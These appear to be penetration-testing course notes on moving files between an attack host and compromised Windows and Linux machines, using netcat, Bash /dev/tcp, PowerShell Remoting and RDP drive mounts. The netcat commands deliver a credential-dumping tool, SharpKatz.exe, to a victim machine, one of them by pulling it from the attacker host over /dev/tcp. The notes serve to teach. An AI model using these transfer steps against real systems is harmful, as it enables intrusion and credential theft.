# Netcat - nc
---
The target or **attacking machine can be used to initiate the connection**, which is helpful if a firewall prevents access to the target.

- On Victim Machine - receiving file:
	- `nc -l -p 8000 > SharpKatz.exe` => Original netcat
	- `ncat -l -p 8000 --recv-only > SharpKatz.exe` => Using ncat
- On Attack Host - uploading file:
	- `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`
	- `ncat --send-only 192.168.49.128 8000 < SharpKatz.exe` => Using ncat

- Instead of listening on our compromised machine, **we can also connect to a port on our attack host to perform the file transfer operation.**:

- Attack Host - Sending File as Input to Netcat:
	- `sudo nc -l -p 443 -q 0 < SharpKatz.exe`
- Compromised Machine Connect to Netcat to Receive the File:
	- `nc 192.168.49.128 443 > SharpKatz.exe`

- If **we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations** on a pseudo-device file `/dev/TCP/`:

- NetCat - Sending File as Input to Netcat:
	- `sudo nc -l -p 443 -q 0 < SharpKatz.exe`
- Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File:
	- `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`

# PowerShell Session File Transfer
---
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions.
- To create a PowerShell Remoting session on a remote computer, **==we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting==** in the session configuration.
- Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
- We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

- From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.:
	- `whoami`=> Administrator
	- `hostname` => DC01
	- `Test-NetConnection -ComputerName DATABASE01 -Port 5985`

- Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

- Create a PowerShell Remoting Session to DATABASE01:
	- `$Session = New-PSSession -ComputerName DATABASE01`
- Copy samplefile.txt from our Localhost to the DATABASE01 Session:
	- `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`
- Copy DATABASE.txt from DATABASE01 Session to our Localhost:
	- `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

# RDP
---
- We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.
- As an alternative to copy and paste, **we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session.**

- Mounting a Linux Folder Using rdesktop:
	- `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
- Mounting a Linux Folder Using xfreerdp:
	- `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
- To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
- **Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.